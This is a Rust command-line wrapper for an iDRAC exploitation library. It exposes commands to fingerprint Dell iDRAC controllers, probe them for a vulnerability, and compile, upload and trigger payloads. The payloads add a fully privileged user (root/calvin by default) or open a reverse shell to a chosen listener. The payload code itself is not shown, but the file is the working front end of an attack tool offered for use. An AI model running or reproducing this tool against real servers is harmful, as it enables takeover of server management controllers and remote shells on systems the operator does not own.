//! Small CLI wrapper around the library — the Python package exposed no
//! console entry point, this exists to demo the ported `iDRAC` API.

use std::collections::HashMap;
use std::time::Duration;

use anyhow::{bail, Result};
use libidrac::{ExploitParams, IDrac, Options};

const USAGE: &str = "\
libiDRAC-rs === iDRAC vulnerability exploitation tool (Rust port of libiDRAC)

USAGE:
    libidrac <IP> <COMMAND> [OPTIONS]

COMMANDS:
    info         Fingerprint the iDRAC (model, firmware, hostname, license)
    check        Probe firmware version + LD_DEBUG indicators
    exploit      Compile + upload + trigger a payload (see --payload)
    inventory    Pull a BIOS inventory over SSH using racadm

OPTIONS:
    --port <N>             Web management port                    [default: 443]
    --username <S>         (exploit) new user / (inventory) SSH user     [root]
    --password <S>         (exploit) new pass  / (inventory) SSH pass   [calvin]
    --privilege <S>        (exploit) privilege bitmask      [0x000001ff]
    --payload <S>          (exploit) adduser | adduser_enterprise | quickpayload | reverseshell
    --reverse-ip <S>       (exploit) reverse shell listener address
    --reverse-port <N>     (exploit) reverse shell listener port

HTTP-LAYER OPTIONS (speed / reliability):
    --timeout <N>          Request timeout in seconds (1-600)     [default: 30]
    --retries <N>          Retry attempts on transport errors (0-10)
                                                                [default: 2]
";

#[tokio::main]
async fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.is_empty() || args.iter().any(|a| a == "--help" || a == "-h") {
        print!("{USAGE}");
        return Ok(());
    }

    // tiny manual parser: --key value flags + free positionals
    let mut positional: Vec<String> = Vec::new();
    let mut flags: std::collections::HashMap<String, String> = Default::default();
    let mut i = 0;
    while i < args.len() {
        let arg = &args[i];
        if arg.starts_with("--") {
            let key = arg.trim_start_matches("--").to_string();
            let Some(value) = args.get(i + 1) else {
                bail!("missing value for --{key}");
            };
            flags.insert(key, value.clone());
            i += 2;
        } else {
            positional.push(arg.clone());
            i += 1;
        }
    }

    let [ip, command] = positional.as_slice() else {
        eprintln!("expected: libidrac <IP> <COMMAND> [OPTIONS]");
        print!("{USAGE}");
        return Ok(());
    };

    let command = command.as_str();
    let port: u16 = flags
        .get("port")
        .map(|v| v.parse().map_err(|_| anyhow::anyhow!("--port must be an integer, got '{v}'")))
        .transpose()?
        .unwrap_or(443);

    let options = Options {
        request_timeout: Duration::from_secs(parse_flag_u64(&flags, "timeout")?.unwrap_or(30).clamp(1, 600)),
        retries: parse_flag_u64(&flags, "retries")?.unwrap_or(2).clamp(0, 10) as u32,
        ..Options::default()
    };

    let idrac = IDrac::with_options(ip, port, options)?;

    match command {
        "info" => {
            let info = idrac.get_info().await?;
            println!("{}", serde_json::to_string_pretty(&info)?);
        }
        "check" => {
            // Like the README recommendation: the LD_DEBUG probe only makes
            // sense once the firmware window is confirmed.
            let info = idrac.get_info().await?;
            if !info.success {
                eprintln!(
                    "warning: get_info failed: {}",
                    info.error.clone().unwrap_or_else(|| "unknown".into())
                );
            }
            let vuln = idrac.check_if_vulnerable().await?;
            println!("{}", serde_json::to_string_pretty(&vuln)?);
        }
        "exploit" => {
            let payload_type = flags.get("payload").map(String::as_str).unwrap_or("adduser");
            let params = ExploitParams {
                payload_type,
                username: flags.get("username").map(String::as_str).unwrap_or("root"),
                password: flags.get("password").map(String::as_str).unwrap_or("calvin"),
                privilege: flags.get("privilege").map(String::as_str).unwrap_or("0x000001ff"),
                reverse_ip: flags.get("reverse-ip").map(String::as_str),
                reverse_port: flags
                    .get("reverse-port")
                    .map(|v| v.parse().map_err(|_| anyhow::anyhow!("--reverse-port must be an integer, got '{v}'")))
                    .transpose()?,
            };
            let result = idrac.exploit(&params).await;
            println!("{}", serde_json::to_string_pretty(&result)?);
            if !result.success {
                std::process::exit(1);
            }
        }
        "inventory" => {
            let result = idrac
                .get_inventory(flags.get("username").map(String::as_str), flags.get("password").map(String::as_str))
                .await;
            if result.success {
                // The raw_logs bool like the python dict value
                println!("{}", result.raw_logs);
            } else {
                println!("{}", serde_json::to_string_pretty(&result)?);
                std::process::exit(1);
            }
        }
        other => {
            eprintln!("unknown command: {other}");
            print!("{USAGE}");
            std::process::exit(1);
        }
    }

    Ok(())
}

/// `--key <u64>` lookup with a consistent parse error.
fn parse_flag_u64(flags: &HashMap<String, String>, key: &str) -> Result<Option<u64>> {
    match flags.get(key) {
        Some(value) => value
            .parse::<u64>()
            .map(Some)
            .map_err(|_| anyhow::anyhow!("--{key} must be a non-negative integer, got '{value}'")),
        None => Ok(None),
    }
}
